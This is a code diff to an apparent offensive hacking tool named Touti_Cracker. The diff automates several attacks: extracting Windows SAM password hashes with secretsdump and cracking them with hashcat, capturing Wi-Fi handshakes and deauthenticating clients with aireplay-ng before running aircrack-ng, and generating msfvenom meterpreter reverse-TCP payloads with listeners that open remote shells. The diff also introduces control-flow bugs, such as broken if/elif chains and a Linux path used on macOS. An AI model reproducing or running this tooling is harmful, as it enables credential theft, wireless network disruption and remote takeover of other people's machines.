@@ -123,8 +123,10 @@ def check_and_install_dependencies():
 check_and_install_dependencies()
 
 try:
+    import csv
     import secrets
     import pyfiglet
+    import signal
     import os
     import requests
     import webbrowser
@@ -324,8 +326,8 @@ try:
                     exit()
             else:
 
-                print(disclamer+"The feature of saving registers is not available for Linux and Mac yet but it will be in the next update and you can still put target registers in (/Desktop/Backup) check my github account for more details: " + the_link)
-        if registres.lower() == "n":
+                print(error+"The feature of saving registers is not available for Linux and Mac yet but it will be in the next update and you can still put target registers in (/Desktop/Backup) check my github account for more details: " + the_link)
+        elif registres.lower() == "n":
             pass
         else:
             print(error+"Please provide a correct value (y/n)")
@@ -336,9 +338,9 @@ try:
         if request == "y":
             if systemtype == "Windows":
                 chemin_fichier = "C:\\Users\\" + user + "\\Desktop\\Touti_Cracker\\passwordlist.txt"
-            elif systemtype == "Linux":
+            if systemtype == "Linux":
                 chemin_fichier = "/home/" + user + "/Desktop/Touti_Cracker/passwordlist.txt"
-            elif systemtype == "Darwin":
+            if systemtype == "Darwin":
                 chemin_fichier = "/Users/" + user + "/Desktop/Touti_Cracker/passwordlist.txt"
             def remove_spaces(text):
                 return text.replace(" ", "")
@@ -365,35 +367,23 @@ try:
 
 
                 print(info+"Extracting hashes from system and SAM files...")
-                if systemtype == "Windows":
-                    command_for_extracth = (
-                        f'py C:\\Users\\{user}\\AppData\\Local\\Programs\\Python\\{versionpy}\\Scripts\\secretsdump.py '
-                        f'-sam C:\\Users\\{user}\\Desktop\\Backup\\sam.save '
-                        f'-system C:\\Users\\{user}\\Desktop\\Backup\\system.save LOCAL'
+                
+                command_for_extracth = (
+                    f'python C:\\Users\\{user}\\AppData\\Local\\Programs\\Python\\{versionpy}\\Scripts\\secretsdump.py '
+                    f'-sam C:\\Users\\{user}\\Desktop\\Backup\\sam.save '
+                    f'-system C:\\Users\\{user}\\Desktop\\Backup\\system.save LOCAL'
                     )
-                elif systemtype == "Linux":
-                    command_for_extracth = (
-                        f'impacket-secretsdump '
-                        f'-sam /home/{user}/Desktop/Backup/sam.save '
-                        f'-system /home/{user}/Desktop/Backup/system.save LOCAL'
-                    )
-                elif systemtype == "Darwin":
-                    command_for_extracth = (
-                        f'impacket-secretsdump '
-                        f'-sam /Users/{user}/Desktop/Backup/sam.save '
-                        f'-system /Users/{user}/Desktop/Backup/system.save LOCAL'
-                    )
+
                 
                 resultextract = subprocess.run(command_for_extracth, shell=True, capture_output=True, text=True)
                 print(info+"These are the results:\n" + resultextract.stdout)
+                if resultextract.stderr.startswith("ERROR:") or resultextract.stdout=="":
+                    print(error+"\n=== Secretsdump Errors ===")
+                    print(resultextract.stderr)
 
                 yourhash = input(inpute+"Please write the hash that you want to crack (from the results): ")
-                if systemtype == "Windows":
-                    chemin_extraction2 = chemin_extraction + "\\hashcat-6.2.6\\hashcat.exe"
-                elif systemtype == "Linux":
-                    subprocess.run(f"hashcat", shell=True, text=True)
-                elif systemtype == "Darwin":
-                    subprocess.run(f"hashcat", shell=True, text=True)
+                
+                chemin_extraction2 = chemin_extraction + "\\hashcat-6.2.6\\hashcat.exe"
                 os.chdir(os.path.dirname(chemin_extraction2)) 
                 print(info+"Launching Hashcat...")
 
@@ -403,6 +393,60 @@ try:
                 if command_lunch_hashcats.stderr:
                     print(error+"\n=== Hashcat Errors ===")
                     print(command_lunch_hashcats.stderr)
+
+            elif systemtype == "Linux":
+                print(disclamer+"You need to have the system.save and sam.save files in the /home/"+user+"/Desktop/Backup directory to extract hashes from them.")
+                command_for_extracth = (
+                        f'impacket-secretsdump '
+                        f'-sam /home/{user}/Desktop/Backup/sam.save '
+                        f'-system /home/{user}/Desktop/Backup/system.save LOCAL'
+                )
+                resultextract = subprocess.run(command_for_extracth, shell=True, capture_output=True, text=True)
+                print(info+"These are the results:\n" + resultextract.stdout)
+                if resultextract.stderr.startswith("ERROR:") or resultextract.stdout=="":
+                    print(error+"\n=== Secretsdump Errors ===")
+                    print(resultextract.stderr)
+
+                yourhash = input(inpute+"Please write the hash that you want to crack (from the results): ")
+                command_lunch_hashcat = f'hashcat -O -m 1000 "{yourhash}" "{chemin_fichier}"'
+                command_lunch_hashcats = subprocess.run(command_lunch_hashcat, shell=True, capture_output=True, text=True)
+                print(command_lunch_hashcats.stdout)
+
+                if command_lunch_hashcats.stderr:
+                    print(error+"\n=== Hashcat Errors ===")
+                    print(command_lunch_hashcats.stderr)
+
+            elif systemtype == "Darwin":
+                print(disclamer+"You need to have the system.save and sam.save files in the /home/"+user+"/Desktop/Backup directory to extract hashes from them.")
+                command_for_extracth = (
+                        f'impacket-secretsdump '
+                        f'-sam /Users/{user}/Desktop/Backup/sam.save '
+                        f'-system /Users/{user}/Desktop/Backup/system.save LOCAL'
+                )
+                resultextract = subprocess.run(command_for_extracth, shell=True, capture_output=True, text=True)
+                print(info+"These are the results:\n" + resultextract.stdout)
+                if resultextract.stderr.startswith("ERROR:") or resultextract.stdout=="":
+                    print(error+"\n=== Secretsdump Errors ===")
+                    print(resultextract.stderr)
+
+                yourhash = input(inpute+"Please write the hash that you want to crack (from the results): ")
+                command_lunch_hashcat = f'hashcat -O -m 1000 "{yourhash}" "{chemin_fichier}"'
+                command_lunch_hashcats = subprocess.run(command_lunch_hashcat, shell=True, capture_output=True, text=True)
+                print(command_lunch_hashcats.stdout)
+                if command_lunch_hashcats.stderr:
+                    print(error+"\n=== Hashcat Errors ===")
+                    print(command_lunch_hashcats.stderr)
+                    print(warning+"You may need to check the system.save and sam.save files in the /Users/"+user+"/Desktop/Backup directory to extract hashes from them.")
+                    exit()
+            command_lunch_hashcat = f'"{chemin_extraction2}" -O -m 1000 "{yourhash}" "{chemin_fichier}"'
+            command_lunch_hashcats = subprocess.run(command_lunch_hashcat, shell=True, capture_output=True, text=True)
+            print(command_lunch_hashcats.stdout)
+
+            if command_lunch_hashcats.stderr:
+                print(error+"\n=== Hashcat Errors ===")
+                print(command_lunch_hashcats.stderr)
+
+
         elif request == "n":   
             request=input(inpute+"Do you want to regenerate a new password list (y/n):").strip().lower() 
             if request=="y":
@@ -422,9 +466,9 @@ try:
             print(info+"customizing password generator...")
             if systemtype == "Windows":
                 chemin_fichier = "C:\\Users\\"+user+"\\Desktop\\Touti_Cracker\\passwordlist.txt"
-            elif systemtype == "Linux":
+            if systemtype == "Linux":
                 chemin_fichier = "/home/"+user+"/Desktop/Touti_Cracker/passwordlist.txt"
-            elif systemtype == "Darwin":
+            if systemtype == "Darwin":
                 chemin_fichier = "/Users/"+user+"/Desktop/Touti_Cracker/passwordlist.txt"
             number_of_generated_words = int(input(inpute+"How many passwords do you want to generate for brute force? : "))
             informations = []
@@ -482,21 +526,90 @@ try:
             print(error+"Please enter a valid choice (1/2).")
             return
         print(info+f"All passwords have been saved to: {chemin_fichier}")
-        cracker()
-
-    def automated_wifi_attack():
-        time.sleep(15)
-        subprocess.run("airmon-ng start wlan0 && airodump-ng wlan0 ", shell=True, text=True)
         
 
+    def automated_wifi_attack():
 
-        commands= [
-            "aireplay-ng -0 10 -a [BSSID] -c [CLIENT] wlan0",
-            "aircrack-ng -b [BSSID] [CAPTURE_FILE]"
-        ]
-        for command in commands:
-            print(info+"Executing commands!")
-            subprocess.run(command, shell=True, text=True)
+        interface = "wlan0"
+
+        print("🔁 Enabling monitor mode...")
+        subprocess.run(f"airmon-ng start {interface}", shell=True)
+        if systemtype == "Linux":
+            output_base = "/home/" + user + "/Desktop/captures/scan"
+        if systemtype == "Darwin":
+            output_base = "/Users/" + user + "/Desktop/captures/scan"
+        os.makedirs(os.path.dirname(output_base), exist_ok=True)
+        extensions = [".csv", ".cap", ".netxml", ".kismet.csv", ".kismet.netxml"]
+
+        
+        for ext in extensions:
+            path = f"{output_base}-01{ext}"
+            if os.path.exists(path):
+                os.remove(path)
+
+        print("📡 Scanning nearby networks for 15 seconds...")
+        scan = subprocess.Popen(
+            f"airodump-ng {interface} -w{output_base} --output-format csv",
+            shell=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            start_new_session=True
+        )
+        time.sleep(15)
+        os.killpg(os.getpgid(scan.pid), signal.SIGINT)        
+        scan.wait()
+        print("✅ Scan complete. Check 'scan-01.csv' for BSSID and Channel.")
+        with open("/home/" + user + "/Desktop/captures/scan-01.csv", newline='', encoding="utf-8") as csvfile:
+            reader = csv.reader(csvfile)
+            for row in reader:
+                print(" | ".join(row))
+        target = input("📥 Enter the target BSSID and channel (comma-separated, e.g. 12:34:56:78:90:AB,6): ").strip().split(",")
+        if len(target) != 2:
+            print("❌ Invalid input.")
+            return
+
+        BSSID, Channel = target
+        print(f"🎯 Target: BSSID={BSSID}, Channel={Channel}")
+
+        print("🛰️  Starting airodump-ng for 15 seconds...")
+        airodump = subprocess.Popen(
+            f"airodump-ng -c {Channel} --bssid {BSSID} -w capture {interface}",
+            shell=True,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            start_new_session=True
+        )
+        time.sleep(15)
+        airodump.terminate()
+        os.killpg(os.getpgid(airodump.pid), signal.SIGINT)
+        airodump.wait()
+        print("✅ Capture complete. Check 'capture-01.cap' for captured packets.")
+        client = input("📥 Enter the target client MAC address: ").strip()
+
+        print("⚡ Sending deauth packets...")
+        subprocess.run(
+            f"aireplay-ng --deauth 10 -a {BSSID} -c {client} {interface}",
+            shell=True
+        )
+
+        choice = input("❓ Do you have a wordlist? (y/n): ").strip().lower()
+        if choice == "y":
+            wordlist_path = input("📂 Enter the path to your wordlist: ").strip()
+        else:
+            print("⚙️ Generating a default wordlist...")
+            generer_mots_de_passe()
+            if systemtype == "Windows":
+                wordlist_path = "C:\\Users\\" + user + "\\Desktop\\Touti_Cracker\\passwordlist.txt"
+            if systemtype == "Linux":
+                wordlist_path = "/home/" + user + "/Desktop/Touti_Cracker/passwordlist.txt"
+            if systemtype == "Darwin":
+                wordlist_path = "/Users/" + user + "/Desktop/Touti_Cracker/passwordlist.txt"
+
+        print("🔓 Launching aircrack-ng...")
+        subprocess.run(
+            f"aircrack-ng -b {BSSID} -w {wordlist_path} capture-01.cap",
+            shell=True
+        )
 
 
     while True:
@@ -572,32 +685,9 @@ try:
                         print(info+second+" Manually(Creates a Terminal Window where you can lunch aircrack-ng commands)")
                         choice = input(inpute+"Please choose an option: ")
                         if choice == "1":
-                            subprocess.run("airmon-ng start wlan0", shell=True, text=True)
-                            time.sleep(15)
-                            subprocess.run("airodump-ng wlan0", shell=True, text=True)
-                            Bssid=""
-                            Chanel=""
-                            target= input(inpute+f"Please enter the target BSSID and the used Chanel: {Bssid},{Chanel}: ").strip().split(",")
-                            time.sleep(15)
-                            subprocess.run (f"airodump-ng -c2 {Chanel} --bssid {Bssid}", shell=True, text=True)
-                            Client=""
-                            targetC= input(inpute+f"Please enter the target Client: {Client}: ").strip()
-                            time.sleep(15)
-                            print(warning+'Maximum wait time is set to 15 seconds by default write " Touti --help " for more details')
-                            print(info+"Encrease wait time for better results")
-                            subprocess.run (f"airodump-ng -c2 {Chanel} -w Touti --bssid {Bssid} & aireplay-ng --deauth 10 -a {Bssid} -c {Client} wlan0 ", shell=True, text=True)
-                            choice= input(inpute+"Do you have a word list? (y/n): ").strip().lower()
-                            if choice == "y":
-                                chemin_fichierW = input(inpute+"Please enter the path to the wordlist: ")
-                                subprocess.run(f"aircrack-ng Touti-01.cap -w {chemin_fichierW}", shell=True, text=True)
-                            elif choice == "n":
-                                print(info+"Generating a new wordlist...")
-                                generer_mots_de_passe()
-                                subprocess.run(f"aircrack-ng Touti-01.cap -w {chemin_fichierW}", shell=True, text=True)
-
-
+                            automated_wifi_attack()
                         elif choice == "2":
-                            subprocess.run("gnome-terminal -- bash -c 'aircrack-ng; exec bash'", shell=True, text=True)
+                            subprocess.run("bash  -c 'aircrack-ng; exec bash'", shell=True, text=True)
                         else:
                             print(error+"Please enter a valid choice (1/2).")
             elif choice == "9":
@@ -630,16 +720,16 @@ try:
                     elif systemtype == "Linux":
                         if platformattack == "windows":
                             print("Creating Payload...")
-                            command=msfvenom+" -p windows/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
+                            command="msfvenom -p windows/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
                             subprocess.run(command, shell=True, text=True)
                             print(info+"Creating a Tcp listener...")
-                            subprocess.run(msfconsole+" -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
+                            subprocess.run("msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
                         elif platformattack == "linux":
                             print("Creating Payload...")
-                            command=msfvenom+" -p linux/x86/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
+                            command="msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
                             subprocess.run(command, shell=True, text=True)
                             print(info+"Creating a Tcp listener...")
-                            subprocess.run(msfconsole+" -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
+                            subprocess.run("msfconsole -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
                         else:
                             print(error+"MacOS and Android are not supported yet but it will be in the next update. StayTuned: " + the_link)    
                     else :
@@ -677,16 +767,16 @@ try:
                     elif systemtype == "Linux":
                         if platformattack == "windows":
                             print("Creating Payload...")
-                            command=msfvenom+" -p windows/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
+                            command="msfvenom -p windows/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
                             subprocess.run(command, shell=True, text=True)
                             print(info+"Creating a Tcp listener...")
-                            subprocess.run(msfconsole+" -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
+                            subprocess.run("msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
                         elif platformattack == "linux":
                             print("Creating Payload...")
-                            command=msfvenom+" -p linux/x86/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
+                            command="msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+ip+" lport="+port+" -f "+extension+" > "+payloadname
                             subprocess.run(command, shell=True, text=True)
                             print(info+"Creating a Tcp listener...")
-                            subprocess.run(msfconsole+" -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
+                            subprocess.run("msfconsole -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "+ip+"; set lport "+port+"; exploit'", shell=True, text=True)
                         else:
                             print(error+"MacOS and Android are not supported yet but it will be in the next update. StayTuned: " + the_link)    
                     elif systemtype == "Darwin":
